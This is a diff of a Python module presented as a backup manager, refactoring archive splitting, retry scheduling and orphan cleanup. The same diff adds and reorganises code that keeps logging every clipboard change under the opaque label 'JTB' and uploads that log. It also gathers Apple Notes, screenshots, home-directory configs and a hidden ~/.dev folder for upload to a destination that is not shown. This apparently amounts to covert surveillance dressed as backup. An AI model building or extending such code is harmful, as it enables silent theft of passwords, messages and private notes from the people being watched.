-                        if file_size > 0:  # 跳过空文件
-                            dir_size += file_size
-                    except OSError as e:
-                        logging.error(f"获取文件大小失败 {file_path}: {e}")
-                        continue
+            dir_size = sum(
+                entry[1] for entry in manifest.values() if entry[0] == "file")
+
+            if not self._ensure_free_space(
+                    dir_size, os.path.dirname(zip_file_path) or zip_file_path):
+                return None
 
             if dir_size > self.config.MAX_SOURCE_DIR_SIZE:
-                return self.split_large_directory(folder_path, zip_file_path)
-
-            if not self._ensure_free_space(dir_size, os.path.dirname(zip_file_path) or zip_file_path):
-                return None
+                archive_paths = split_archive(
+                    folder_path,
+                    zip_file_path,
+                    self.config.MAX_SOURCE_DIR_SIZE,
+                )
+                self._clean_directory(folder_path)
+                logging.info(f"已分割为 {len(archive_paths)} 个压缩文件")
+                return archive_paths
 
             tar_path = f"{zip_file_path}.tar.gz"
-            if os.path.exists(tar_path):
-                os.remove(tar_path)
-
-            with tarfile.open(tar_path, "w:gz", compresslevel=BackupConfig.TAR_COMPRESS_LEVEL) as tar:
-                tar.add(folder_path, arcname=os.path.basename(folder_path))
-
-            # 验证压缩文件
-            try:
-                compressed_size = os.path.getsize(tar_path)
-                if compressed_size == 0:
-                    logging.error(f"压缩文件大小为0 {tar_path}")
-                    if os.path.exists(tar_path):
-                        os.remove(tar_path)
-                    return None
-                    
-                self._clean_directory(folder_path)
-                return tar_path
-            except OSError as e:
-                logging.error(f"获取压缩文件大小失败 {tar_path}: {e}")
-                if os.path.exists(tar_path):
-                    os.remove(tar_path)
-                return None
-                
-        except (OSError, IOError, PermissionError, tarfile.TarError) as e:
+            create_archive(
+                folder_path,
+                tar_path,
+                compresslevel=self.config.TAR_COMPRESS_LEVEL,
+            )
+            self._clean_directory(folder_path)
+            return tar_path
+        except (OSError, IOError, PermissionError, tarfile.TarError,
+                ArchiveError) as e:
             logging.error(f"压缩失败 {folder_path}: {e}")
             return None
 
-    def split_large_directory(self, folder_path, base_zip_path):
-        """将大目录分割成多个小块并分别压缩
-        
-        Args:
-            folder_path: 要分割的目录路径
-            base_zip_path: 基础压缩文件路径
-            
-        Returns:
-            list: 压缩文件路径列表
-        """
+    def next_timestamped_archive_base(self, prefix):
+        """分配不与磁盘文件或 pending 记录冲突的秒级时间戳归档名。"""
+        now = datetime.now()
+        pending_keys = self._state.get("pending_archives", {})
+        for offset in range(120):
+            timestamp = (now + timedelta(seconds=offset)).strftime(
+                "%Y%m%d_%H%M%S")
+            base = os.path.join(self.config.BACKUP_ROOT, f"{prefix}_{timestamp}")
+            final_name = f"{base}.tar.gz"
+            candidates = [
+                final_name,
+                f"{base}_part0.tar.gz",
+            ]
+            candidates.extend(
+                glob.glob(f"{glob.escape(base)}_part*.tar.gz"))
+            if (not any(os.path.exists(path) for path in candidates)
+                    and archive_group_key(final_name) not in pending_keys):
+                return base
+        raise RuntimeError(f"无法分配唯一归档名: {prefix}")
+
+    def cleanup_orphan_archives(self):
+        """删除未登记 pending 的旧归档及压缩临时文件。"""
+        pending_keys = set(self._state.get("pending_archives", {}))
+        cutoff = time.time() - self.config.ORPHAN_ARCHIVE_AGE
+        removed = 0
         try:
-            compressed_files = []
-            part_num = 0
-            
-            # 创建临时目录存放分块
-            temp_dir = os.path.join(os.path.dirname(folder_path), "temp_split")
-            if not self._ensure_directory(temp_dir):
-                return None
-
-            # 目录分包的目标是控制每个归档的源文件总量，而不是使用“压缩后 50MB”去跳过源文件。
-            # 单个归档即使压缩后超过 50MB，也由 upload_file 在最终上传阶段安全分片。
-            MAX_CHUNK_SIZE = self.config.MAX_SOURCE_DIR_SIZE
-
-            # 先收集所有文件信息
-            all_files = []
-            for dirpath, _, filenames in os.walk(folder_path):
-                for filename in filenames:
-                    file_path = os.path.join(dirpath, filename)
-                    try:
-                        file_size = os.path.getsize(file_path)
-                        rel_path = os.path.relpath(file_path, folder_path)
-                        all_files.append((file_path, rel_path, file_size))
-                    except OSError:
-                        continue
-
-            # 按文件大小降序排序
-            all_files.sort(key=lambda x: x[2], reverse=True)
-            if not all_files:
-                self._clean_directory(temp_dir)
-                logging.error(f"源目录没有可备份文件 {folder_path}")
-                return None
-
-            def _build_chunk(chunk):
-                """复制一个分块并打包。返回 (成功标志, 归档路径或 None)。"""
-                nonlocal part_num
-                if not chunk:
-                    return True, None
-
-                current_part_num = part_num
-                part_dir = os.path.join(temp_dir, f"part{current_part_num}")
-                if not self._ensure_directory(part_dir):
-                    return False, None
-
-                copied = False
+            for path in Path(self.config.BACKUP_ROOT).iterdir():
+                if not path.is_file():
+                    continue
+                name = path.name
+                if not (
+                        name.endswith(".tar.gz")
+                        or ".tar.gz.part" in name
+                        or name.endswith(".partial")):
+                    continue
+                if (name.endswith(".tar.gz")
+                        and archive_group_key(name) in pending_keys):
+                    continue
+                if ".tar.gz.part" in name and archive_group_key(name) in pending_keys:
+                    continue
                 try:
-                    for src, dst_rel, file_size in chunk:
-                        dst = os.path.join(part_dir, dst_rel)
-                        dst_dir = os.path.dirname(dst)
-                        if not self._ensure_directory(dst_dir):
-                            return False, None
-                        if not self._ensure_free_space(file_size, dst_dir):
-                            return False, None
-                        shutil.copy2(src, dst)
-
-                    tar_path = f"{base_zip_path}_part{current_part_num}.tar.gz"
-                    if os.path.exists(tar_path):
-                        os.remove(tar_path)
-                    with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
-                        tar.add(part_dir, arcname=os.path.basename(folder_path))
-
-                    compressed_size = os.path.getsize(tar_path)
-                    if compressed_size == 0:
-                        os.remove(tar_path)
-                        return False, None
-
-                    copied = True
-                    return True, tar_path
-                except (OSError, IOError, PermissionError, tarfile.TarError) as e:
-                    logging.error(f"分块打包失败: {e}")
-                    return False, None
-                finally:
-                    self._clean_directory(part_dir)
-
-            # 使用简单贪心分组，把所有文件（含空文件和超大文件）都纳入归档。
-            current_chunk = []
-            current_chunk_size = 0
-            for file_info in all_files:
-                file_path, rel_path, file_size = file_info
-                if current_chunk and current_chunk_size + file_size > MAX_CHUNK_SIZE:
-                    success, tar_path = _build_chunk(current_chunk)
-                    if not success:
-                        self._clean_directory(temp_dir)
-                        logging.error("目录分包失败，保留待打包目录")
-                        return None
-                    if tar_path:
-                        compressed_files.append(tar_path)
-                    part_num += 1
-                    current_chunk = []
-                    current_chunk_size = 0
-
-                current_chunk.append(file_info)
-                current_chunk_size += file_size
-
-            if current_chunk:
-                success, tar_path = _build_chunk(current_chunk)
-                if not success:
-                    self._clean_directory(temp_dir)
-                    logging.error("目录分包失败，保留待打包目录")
-                    return None
-                if tar_path:
-                    compressed_files.append(tar_path)
-
-            self._clean_directory(temp_dir)
-
-            if not compressed_files:
-                logging.error("分割失败，没有生成有效的压缩文件")
-                return None
-
-            # 只有全部源文件都已进入有效归档后才清理源目录。
-            self._clean_directory(folder_path)
-            logging.info(f"已分割为 {len(compressed_files)} 个压缩文件")
-            return compressed_files
-        except Exception:
-            logging.error("分割失败")
-            return None
-
-    def _process_partial_chunk(self, chunk, temp_dir, base_zip_path, part_num, compressed_files, archive_root_name=None):
-        """处理部分分块
-        
-        Args:
-            chunk: 要处理的文件列表
-            temp_dir: 临时目录路径
-            base_zip_path: 基础压缩文件路径
-            part_num: 分块编号
-            compressed_files: 压缩文件列表
-            archive_root_name: 归档内部保留的原始目录名
-        """
-        if not archive_root_name:
-            logging.error("子分包缺少归档根目录名，无法保持原始目录结构")
-            return
-        part_dir = os.path.join(temp_dir, f"part{part_num}_sub")
-        if not self._ensure_directory(part_dir):
-            return
-        
-        chunk_success = True
-        total_size = 0
-        for src, dst_rel, file_size in chunk:
-            dst = os.path.join(part_dir, dst_rel)
-            dst_dir = os.path.dirname(dst)
-            if not self._ensure_directory(dst_dir):
-                chunk_success = False
-                break
-            try:
-                shutil.copy2(src, dst)
-                total_size += file_size
-            except Exception:
-                chunk_success = False
-                break
-        
-        if chunk_success:
-            tar_path = f"{base_zip_path}_part{part_num}_sub.tar.gz"
-            try:
-                with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
-                    tar.add(part_dir, arcname=archive_root_name)
-                
-                compressed_size = os.path.getsize(tar_path)
-                if compressed_size <= self.config.MAX_SINGLE_FILE_SIZE:
-                    compressed_files.append(tar_path)
-                    logging.info(f"子分块: {total_size / 1024 / 1024:.1f}MB -> {compressed_size / 1024 / 1024:.1f}MB")
-                else:
-                    os.remove(tar_path)
-            except Exception:
-                if os.path.exists(tar_path):
-                    os.remove(tar_path)
-        
-        self._clean_directory(part_dir)
+                    if path.stat().st_mtime >= cutoff:
+                        continue
+                    path.unlink()
+                    removed += 1
+                except OSError as exc:
+                    logging.warning(f"⚠️ 清理残留归档失败 {path}: {exc}")
+        except OSError as exc:
+            logging.error(f"扫描残留归档失败: {exc}")
+        if removed:
+            logging.info(f"🧹 已清理 {removed} 个未登记 pending 的残留归档")
+        return removed
 
     def get_clipboard_content(self):
         """获取JTB内容"""
@@ -1888,63 +2451,47 @@ class BackupManager:
             # 这里不记录错误日志，只返回 None，避免日志被高频刷屏
             return None
 
+    def _clipboard_lock(self):
+        lock = getattr(self, "_clipboard_file_lock", None)
+        if lock is None:
+            lock = threading.RLock()
+            self._clipboard_file_lock = lock
+        return lock
+
     def log_clipboard_update(self, content, file_path):
-        """记录JTB更新到文件"""
-        try:
-            # 确保目录存在
-            os.makedirs(os.path.dirname(file_path), exist_ok=True)
-            
-            # 写入日志
-            with open(file_path, 'a', encoding='utf-8', errors='ignore') as f:
-                f.write(f"\n=== 📋 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
-                f.write(f"{content}\n")
-                f.write("-"*30 + "\n")
-        except (OSError, IOError, PermissionError) as e:
-            if self.config.DEBUG_MODE:
-                logging.error(f"❌ 记录JTB失败: {e}")
+        """记录JTB更新到文件，写入成功时返回 True。"""
+        return append_clipboard_update(
+            file_path, content, self._clipboard_lock())
 
     def monitor_clipboard(self, file_path, interval=3):
-        """监控JTB变化并记录到文件
-        
-        Args:
-            file_path: 日志文件路径
-            interval: 检查间隔（秒）
-        """
-        # 确保日志目录存在
-        log_dir = os.path.dirname(file_path)
-        if not os.path.exists(log_dir):
-            try:
-                os.makedirs(log_dir, exist_ok=True)
-            except Exception as e:
-                logging.error(f"❌ 创建JTB日志目录失败: {e}")
-                return
+        """启动剪贴板监控循环。"""
+        run_clipboard_monitor(
+            self,
+            file_path,
+            interval or self.config.CLIPBOARD_CHECK_INTERVAL,
+            getattr(self, "_worker_stop_event", None),
+        )
 
-        last_content = ""
-        error_count = 0  # 添加错误计数
-        max_errors = 5   # 最大连续错误次数
-        
-        while True:
-            try:
-                current_content = self.get_clipboard_content()
-                # 只有当JTB内容非空且与上次不同时才记录
-                if current_content and current_content != last_content:
-                    self.log_clipboard_update(current_content, file_path)
-                    last_content = current_content
-                    if self.config.DEBUG_MODE:
-                        logging.info("📋 检测到JTB更新")
-                    error_count = 0  # 重置错误计数
-                else:
-                    error_count = 0  # 空内容不算错误，重置计数
-            except Exception as e:
-                error_count += 1
-                if error_count >= max_errors:
-                    if self.config.DEBUG_MODE:
-                        logging.error(f"❌ JTB监控连续出错{max_errors}次，等待{self.config.CLIPBOARD_ERROR_WAIT}秒后重试")
-                    time.sleep(self.config.CLIPBOARD_ERROR_WAIT)
-                    error_count = 0  # 重置错误计数
-                elif self.config.DEBUG_MODE:
-                    logging.error(f"❌ JTB监控出错: {e}")
-            time.sleep(interval if interval else self.config.CLIPBOARD_CHECK_INTERVAL)
+    def start_clipboard_workers(self, clipboard_log_path):
+        """启动且只启动一组剪贴板监控/上传线程。"""
+        service = getattr(self, "_clipboard_workers", None)
+        if service is None or not any(
+                thread.is_alive() for thread in service.threads):
+            service = ClipboardWorkers(self, clipboard_log_path)
+            self._clipboard_workers = service
+            self._worker_stop_event = service.stop_event
+            self._clipboard_threads = service.threads
+        started = service.start()
+        self._clipboard_threads = service.threads
+        self._worker_stop_event = service.stop_event
+        return started
+
+    def stop_clipboard_workers(self, timeout=5):
+        """通知并等待剪贴板线程退出，供管理器重建前调用。"""
+        service = getattr(self, "_clipboard_workers", None)
+        if service is not None:
+            service.stop(timeout=timeout)
+        self._clipboard_threads = []
 
     def upload_backup(self, backup_path):
         """上传备份文件
@@ -2102,64 +2649,22 @@ class BackupManager:
             failed_files=missing_files, changed_records=changed_records,
         )
 
+    def get_clipboard_log_state(self, file_path):
+        """区分空文件、有效内容与读取失败，避免把 I/O 错误当成空内容。"""
+        return get_clipboard_log_state(
+            file_path, self._clipboard_lock())
+
     def has_clipboard_content(self, file_path):
-        """检查粘贴板文件是否有实际内容记录
-        
-        Args:
-            file_path: 粘贴板日志文件路径
-            
-        Returns:
-            bool: 是否有实际内容记录
-        """
-        try:
-            if not os.path.exists(file_path):
-                return False
-                
-            # 检查文件大小
-            file_size = os.path.getsize(file_path)
-            if file_size == 0:
-                return False
-                
-            # 读取文件内容
-            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-                content = f.read().strip()
-                
-            if not content:
-                return False
-                
-            # 检查是否只包含标题行（没有实际内容）
-            lines = content.split('\n')
-            actual_content_lines = []
-            
-            for line in lines:
-                line = line.strip()
-                # 跳过空行、标题行和分隔线
-                if (line and 
-                    not line.startswith('===') and 
-                    not line.startswith('📋') and 
-                    not line.startswith('-') * 30 and
-                    not line.startswith('JTB日志已于') and
-                    not line.startswith('JTB监控启动于')):
-                    actual_content_lines.append(line)
-            
-            # 如果有实际内容行，返回True
-            return len(actual_content_lines) > 0
-            
-        except Exception as e:
-            if self.config.DEBUG_MODE:
-                logging.error(f"检查粘贴板文件内容失败: {e}")
-            return False
+        """保留布尔接口；读取失败不再等同于无内容。"""
+        return self.get_clipboard_log_state(file_path) == CLIPBOARD_LOG_CONTENT
 
-def is_disk_available(disk_path):
-    """检查磁盘是否可用"""
-    try:
-        return os.path.exists(disk_path) and os.access(disk_path, os.R_OK)
-    except Exception:
-        return False
-
-def get_available_volumes():
+def get_available_volumes(backup_manager=None):
     """获取所有可用的数据卷和云盘目录"""
     available_volumes = {}
+    backup_root = (
+        backup_manager.config.BACKUP_ROOT
+        if backup_manager is not None else BackupConfig.BACKUP_ROOT
+    )
     
     # 获取用户主目录
     user_path = os.path.expanduser('~')
@@ -2173,7 +2678,7 @@ def get_available_volumes():
             user_prefix = username[:5] if username else "user"
             
             # 配置用户主目录备份
-            backup_path = os.path.join(BackupConfig.BACKUP_ROOT, f'{user_prefix}_home')
+            backup_path = os.path.join(backup_root, f'{user_prefix}_home')
             available_volumes['home'] = {
                 'docs': (os.path.abspath(user_path), os.path.join(backup_path, f'{user_prefix}_docs'), 1),
                 'configs': (os.path.abspath(user_path), os.path.join(backup_path, f'{user_prefix}_configs'), 2),
@@ -2193,20 +2698,19 @@ def get_available_volumes():
     
     return available_volumes
 
-@lru_cache()
-def get_username():
-    """获取当前用户名"""
-    return os.environ.get('USERNAME', '')
-
-def clean_backup_directory():
+def clean_backup_directory(backup_manager=None):
     """清理备份目录中的临时文件和空目录"""
+    backup_root = (
+        backup_manager.config.BACKUP_ROOT
+        if backup_manager is not None else BackupConfig.BACKUP_ROOT
+    )
     try:
-        if not os.path.exists(BackupConfig.BACKUP_ROOT):
+        if not os.path.exists(backup_root):
             return
         username = getpass.getuser()
         user_prefix = username[:5] if username else "user"
         # 清理临时目录
-        temp_dir = os.path.join(BackupConfig.BACKUP_ROOT, f'{user_prefix}_temp')
+        temp_dir = os.path.join(backup_root, f'{user_prefix}_temp')
         if os.path.exists(temp_dir):
             try:
                 shutil.rmtree(temp_dir)
@@ -2214,7 +2718,7 @@ def clean_backup_directory():
                 logging.error(f"清理临时目录失败: {e}")
         
         # 清理空目录
-        for root, dirs, files in os.walk(BackupConfig.BACKUP_ROOT, topdown=False):
+        for root, dirs, files in os.walk(backup_root, topdown=False):
             for dir_name in dirs:
                 dir_path = os.path.join(root, dir_name)
                 try:
@@ -2235,14 +2739,17 @@ def backup_notes(backup_manager=None):
     username = getpass.getuser()
     user_prefix = username[:5] if username else "user"
     notes_dir = os.path.expanduser('~/Library/Group Containers/group.com.apple.notes')
-    notes_backup_directory = os.path.join(BackupConfig.BACKUP_ROOT, f"{user_prefix}_notes")
-    
-    if not os.path.exists(notes_dir):
-        logging.error("备忘录数据目录不存在")
-        return None, {}, False
-        
     if backup_manager is None:
         backup_manager = BackupManager()
+    notes_backup_directory = os.path.join(
+        backup_manager.config.BACKUP_ROOT, f"{user_prefix}_notes")
+
+    if not os.path.exists(notes_dir):
+        logging.info("ℹ️ 备忘录数据目录不存在，跳过")
+        return None, {}, True
+    if not os.access(notes_dir, os.R_OK):
+        logging.error(f"❌ 备忘录数据目录没有读取权限: {notes_dir}")
+        return None, {}, False
     if not backup_manager._ensure_free_space(0, os.path.dirname(notes_backup_directory) or notes_backup_directory):
         return None, {}, False
     if not backup_manager._clean_directory(notes_backup_directory):
@@ -2408,12 +2915,15 @@ def backup_notes(backup_manager=None):
                         failed_files.append(source_file)
 
         # 附件缺失同样属于备份不完整，必须整体判失败并重试，否则会在压缩后被静默丢弃。
-        if seen_files == 0 or sqlite_failed or failed_files:
+        if sqlite_failed or failed_files:
             logging.error(
                 f"备忘录备份不完整：成功复制 {copied_count} 个文件，"
                 f"数据库快照失败={sqlite_failed}，附件失败 {len(failed_files)} 个"
             )
             return None, {}, False
+        if seen_files == 0:
+            logging.info("ℹ️ 备忘录容器中没有需要备份的数据，跳过")
+            return None, {}, True
         backup_manager._save_backup_state()
         if not changed_records:
             logging.info(
@@ -2471,10 +2981,10 @@ def backup_screenshots(backup_manager=None):
     }
     username = getpass.getuser()
     user_prefix = username[:5] if username else "user"
-    screenshot_backup_directory = os.path.join(BackupConfig.BACKUP_ROOT, f"{user_prefix}_screenshots")
-    
     if backup_manager is None:
         backup_manager = BackupManager()
+    screenshot_backup_directory = os.path.join(
+        backup_manager.config.BACKUP_ROOT, f"{user_prefix}_screenshots")
     
     # 暂存目录只保存本轮新增或内容变化的文件。
     if not backup_manager._ensure_free_space(0, os.path.dirname(screenshot_backup_directory) or screenshot_backup_directory):
@@ -2564,6 +3074,77 @@ def backup_screenshots(backup_manager=None):
     return None, {}, complete
 
 
+def backup_custom_data(backup_manager):
+    """检查并增量备份 ~/.dev/Backup/data/，返回 (归档路径列表, 是否部分失败)。
+
+    data 目录是用户手动存放待上传数据的源目录。压缩前先复制到独立暂存目录，
+    上传并提交成功后，再删除内容与归档一致的原生数据文件。
+    """
+    username = getpass.getuser()
+    user_prefix = username[:5] if username else "user"
+    data_dir = os.path.abspath(os.path.join(
+        backup_manager.config.BACKUP_ROOT, "data"))
+    data_stage = os.path.join(
+        backup_manager.config.BACKUP_ROOT, f"{user_prefix}_data")
+
+    if not os.path.lexists(data_dir):
+        if backup_manager.config.DEBUG_MODE:
+            logging.debug(f"自定义数据目录不存在，跳过: {data_dir}")
+        return [], False
+    if not os.path.isdir(data_dir):
+        logging.error(f"❌ 自定义数据路径不是目录: {data_dir}")
+        return [], True
+    if not os.access(data_dir, os.R_OK):
+        logging.error(f"❌ 自定义数据目录没有读取权限: {data_dir}")
+        return [], True
+    backup_manager._cleanup_uploaded_custom_data()
+    if not backup_manager._ensure_free_space(
+            0, os.path.dirname(data_stage) or data_stage):
+        return [], True
+    if not backup_manager._clean_directory(data_stage):
+        logging.error(f"❌ 无法准备自定义数据暂存目录: {data_stage}")
+        return [], True
+
+    changed_records = {}
+    complete, seen, skipped, failed = backup_manager._copy_tree_if_changed(
+        data_dir,
+        data_stage,
+        CUSTOM_DATA_STATE_PREFIX.rstrip("/"),
+        changed_records,
+    )
+    backup_manager._save_backup_state()
+
+    if not complete:
+        logging.error(
+            f"❌ 自定义数据检查未完整完成: 扫描 {seen} 个，"
+            f"跳过 {skipped} 个，失败 {failed} 个")
+        return [], True
+    if not changed_records:
+        if seen:
+            logging.info(
+                f"⏭️ 自定义数据内容均未变化，跳过归档 ({skipped} 个文件)")
+        else:
+            logging.info("ℹ️ 自定义数据目录为空，跳过归档")
+        return [], False
+
+    archive = backup_manager.zip_backup_folder(
+        data_stage,
+        backup_manager.next_timestamped_archive_base(
+            f"{user_prefix}_mac_data"),
+    )
+    if not archive:
+        logging.error("❌ 自定义数据压缩失败")
+        return [], True
+
+    archive_reference = archive[0] if isinstance(archive, list) else archive
+    backup_manager.register_pending_archive(archive_reference, changed_records)
+    backup_paths = archive if isinstance(archive, list) else [archive]
+    logging.critical(
+        f"☑️ 自定义数据备份文件已准备完成: "
+        f"{len(changed_records)} 个文件")
+    return backup_paths, False
+
+
 def backup_mac_data(backup_manager):
     """备份Mac系统数据，返回 (备份文件路径列表, 是否部分失败)（不执行上传）
     
@@ -2584,7 +3165,8 @@ def backup_mac_data(backup_manager):
         if notes_backup and notes_records:
             backup_path = backup_manager.zip_backup_folder(
                 notes_backup,
-                os.path.join(BackupConfig.BACKUP_ROOT, f"{user_prefix}_notes_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
+                backup_manager.next_timestamped_archive_base(
+                    f"{user_prefix}_notes")
             )
             if backup_path:
                 archive_reference = (
@@ -2611,7 +3193,8 @@ def backup_mac_data(backup_manager):
         if screenshots_backup and screenshot_records:
             backup_path = backup_manager.zip_backup_folder(
                 screenshots_backup,
-                os.path.join(BackupConfig.BACKUP_ROOT, f"{user_prefix}_screenshots_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
+                backup_manager.next_timestamped_archive_base(
+                    f"{user_prefix}_screenshots")
             )
             if backup_path:
                 archive_reference = (
@@ -2675,7 +3258,8 @@ def backup_volumes(backup_manager, available_volumes):
                         continue
                     backup_path = backup_manager.zip_backup_folder(
                         backup_dir, 
-                        str(target_dir) + "_" + datetime.now().strftime("%Y%m%d_%H%M%S")
+                        backup_manager.next_timestamped_archive_base(
+                            os.path.basename(str(target_dir)))
                     )
                     if backup_path:
                         archive_reference = (
@@ -2710,36 +3294,25 @@ def periodic_backup_upload(backup_manager):
     user_prefix = username[:5] if username else "user"
     clipboard_log_path = os.path.join(backup_manager.config.BACKUP_ROOT, f"{user_prefix}_clipboard_log.txt")
     
-    # 启动JTB监控线程
-    clipboard_monitor_thread = threading.Thread(
-        target=backup_manager.monitor_clipboard,
-        args=(clipboard_log_path, backup_manager.config.CLIPBOARD_CHECK_INTERVAL),
-        daemon=True
-    )
-    clipboard_monitor_thread.start()
-    logging.critical("📋 JTB监控线程已启动")
-    
-    # 启动JTB上传线程
-    clipboard_upload_thread_obj = threading.Thread(
-        target=clipboard_upload_thread,
-        args=(backup_manager, clipboard_log_path),
-        daemon=True
-    )
-    clipboard_upload_thread_obj.start()
-    logging.critical("📤 JTB上传线程已启动")
-    
-    # 初始化JTB日志文件
+    # 先初始化日志，再启动监控/上传线程，避免线程在文件创建前竞争。
     try:
         os.makedirs(os.path.dirname(clipboard_log_path), exist_ok=True)
         startup_line = f"=== 📋 JTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n"
-        if os.path.exists(clipboard_log_path):
-            with open(clipboard_log_path, 'a', encoding='utf-8') as f:
-                f.write(startup_line)
-        else:
-            with open(clipboard_log_path, 'w', encoding='utf-8') as f:
-                f.write(startup_line)
+        with backup_manager._clipboard_lock():
+            if os.path.exists(clipboard_log_path):
+                with open(clipboard_log_path, 'a', encoding='utf-8') as f:
+                    f.write(startup_line)
+            else:
+                with open(clipboard_log_path, 'w', encoding='utf-8') as f:
+                    f.write(startup_line)
     except Exception as e:
         logging.error(f"❌ 初始化JTB日志失败: {e}")
+
+    if backup_manager.start_clipboard_workers(clipboard_log_path):
+        logging.critical("📋 JTB监控线程已启动")
+        logging.critical("📤 JTB上传线程已启动")
+    else:
+        logging.warning("⚠️ 剪贴板线程已在运行，未重复启动")
 
     # 获取用户名和系统信息
     username = getpass.getuser()
@@ -2791,77 +3364,11 @@ def periodic_backup_upload(backup_manager):
     logging.critical("📋 JTB监控和自动上传已启动")
     logging.critical("="*50)
 
-    def read_next_backup_time():
-        """读取下次备份时间"""
-        try:
-            if os.path.exists(BackupConfig.THRESHOLD_FILE):
-                with open(BackupConfig.THRESHOLD_FILE, 'r') as f:
-                    time_str = f.read().strip()
-                    next_time = datetime.strptime(time_str, '%Y-%m-%d %H:%M:%S')
-                # 旧版本可能写入过长周期；配置改为 1 天后，不再继续等待旧的远期时间。
-                maximum_next_time = datetime.now() + timedelta(
-                    seconds=BackupConfig.BACKUP_INTERVAL)
-                return min(next_time, maximum_next_time)
-            return None
-        except Exception:
-            return None
-
-    def write_next_backup_time():
-        """写入下次备份时间"""
-        try:
-            next_time = datetime.now() + timedelta(seconds=BackupConfig.BACKUP_INTERVAL)
-            os.makedirs(os.path.dirname(BackupConfig.THRESHOLD_FILE), exist_ok=True)
-            with open(BackupConfig.THRESHOLD_FILE, 'w') as f:
-                f.write(next_time.strftime('%Y-%m-%d %H:%M:%S'))
-            return next_time
-        except Exception as e:
-            logging.error(f"写入下次备份时间失败: {e}")
-            return None
-
-    def read_retry_time():
-        """读取失败后的重试时间。"""
-        try:
-            if os.path.exists(BackupConfig.RETRY_THRESHOLD_FILE):
-                with open(BackupConfig.RETRY_THRESHOLD_FILE, 'r') as f:
-                    time_str = f.read().strip()
-                    return datetime.strptime(time_str, '%Y-%m-%d %H:%M:%S')
-            return None
-        except Exception:
-            return None
-
-    def write_retry_time():
-        """写入失败后的重试时间，不推进正常备份周期。"""
-        try:
-            retry_time = datetime.now() + timedelta(seconds=BackupConfig.ERROR_RETRY_DELAY)
-            os.makedirs(os.path.dirname(BackupConfig.RETRY_THRESHOLD_FILE), exist_ok=True)
-            with open(BackupConfig.RETRY_THRESHOLD_FILE, 'w') as f:
-                f.write(retry_time.strftime('%Y-%m-%d %H:%M:%S'))
-            return retry_time
-        except Exception as e:
-            logging.error(f"写入重试时间失败: {e}")
-            return None
-
-    def clear_retry_time():
-        """成功后清除失败重试时间。"""
-        try:
-            if os.path.exists(BackupConfig.RETRY_THRESHOLD_FILE):
-                os.remove(BackupConfig.RETRY_THRESHOLD_FILE)
-        except Exception:
-            pass
-
-    def should_backup_now():
-        """检查是否应该执行备份"""
-        next_backup_time = read_next_backup_time()
-        retry_time = read_retry_time()
-        if next_backup_time is not None and datetime.now() >= next_backup_time:
-            return True
-        if retry_time is not None and datetime.now() >= retry_time:
-            return True
-        return next_backup_time is None and retry_time is None
-
+    schedule = BackupSchedule(backup_manager.config)
+    retry_attempt = 0
     while True:
         try:
-            if not should_backup_now():
+            if not schedule.should_backup_now():
                 time.sleep(backup_manager.config.BACKUP_CHECK_INTERVAL)
                 continue
 
@@ -2872,8 +3379,9 @@ def periodic_backup_upload(backup_manager):
 
             # 先重试遗留归档，避免本轮清理暂存目录导致同一内容再次打包。
             pending_uploaded = retry_pending_archives(backup_manager)
+            backup_manager.cleanup_orphan_archives()
 
-            available_volumes = get_available_volumes()
+            available_volumes = get_available_volumes(backup_manager)
 
             logging.critical("\n💾 数据卷备份")
             volumes_backup_paths, volumes_partial = backup_volumes(backup_manager, available_volumes)
@@ -2881,8 +3389,20 @@ def periodic_backup_upload(backup_manager):
             logging.critical("\n🍎 Mac系统数据备份")
             mac_data_backup_paths, mac_data_partial = backup_mac_data(backup_manager)
 
-            all_backup_paths = volumes_backup_paths + mac_data_backup_paths
-            backup_partial = volumes_partial or mac_data_partial
+            logging.critical("\n📦 自定义数据备份")
+            custom_data_backup_paths, custom_data_partial = backup_custom_data(
+                backup_manager)
+
+            all_backup_paths = (
+                volumes_backup_paths
+                + mac_data_backup_paths
+                + custom_data_backup_paths
+            )
+            backup_partial = (
+                volumes_partial
+                or mac_data_partial
+                or custom_data_partial
+            )
             backup_complete = not backup_partial
 
             if all_backup_paths and backup_complete:
@@ -2927,19 +3447,27 @@ def periodic_backup_upload(backup_manager):
                 all_backup_paths, backup_complete, upload_success,
                 pending_uploaded)
             if cycle_succeeded:
-                next_backup_time = write_next_backup_time()
-                clear_retry_time()
+                retry_attempt = 0
+                backup_manager.prune_stale_state()
+                next_backup_time = schedule.write_next_backup_time()
+                schedule.clear_retry_time()
                 logging.critical("✅ 备份与上传全部完成")
                 if next_backup_time:
                     logging.critical(f"🔄 下次启动备份时间: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
                 time.sleep(backup_manager.config.BACKUP_CHECK_INTERVAL)
             else:
-                retry_time = write_retry_time()
+                retry_delay = min(
+                    backup_manager.config.ERROR_RETRY_DELAY
+                    * (2 ** min(retry_attempt, 10)),
+                    backup_manager.config.MAX_RETRY_DELAY,
+                )
+                retry_attempt += 1
+                retry_time = schedule.write_retry_time(retry_delay)
                 if retry_time:
                     logging.critical(
                         f"🔄 备份未完整完成（{'；'.join(incomplete_reasons)}），"
                         f"将在 {retry_time.strftime('%H:%M:%S')} 后重试")
-                time.sleep(backup_manager.config.ERROR_RETRY_DELAY)
+                time.sleep(retry_delay)
 
         except Exception as e:
             logging.error(f"\n❌ 备份出错: {e}")
@@ -2947,15 +3475,23 @@ def periodic_backup_upload(backup_manager):
                 backup_and_upload_logs(backup_manager)
             except Exception as log_error:
                 logging.error(f"❌ 日志备份失败: {log_error}")
-            write_retry_time()
-            time.sleep(backup_manager.config.ERROR_RETRY_DELAY)
+            retry_delay = min(
+                backup_manager.config.ERROR_RETRY_DELAY
+                * (2 ** min(retry_attempt, 10)),
+                backup_manager.config.MAX_RETRY_DELAY,
+            )
+            retry_attempt += 1
+            schedule.write_retry_time(retry_delay)
+            time.sleep(retry_delay)
 
 
 def find_pending_backup_files(backup_manager, backup_root=None):
-    """查找上传失败后仍保留在备份根目录中的归档文件。"""
+    """只查找 pending 状态中登记过的本地归档文件。"""
     root = Path(backup_root) if backup_root else Path(
         backup_manager.config.BACKUP_ROOT)
     pending = []
+    pending_keys = set(
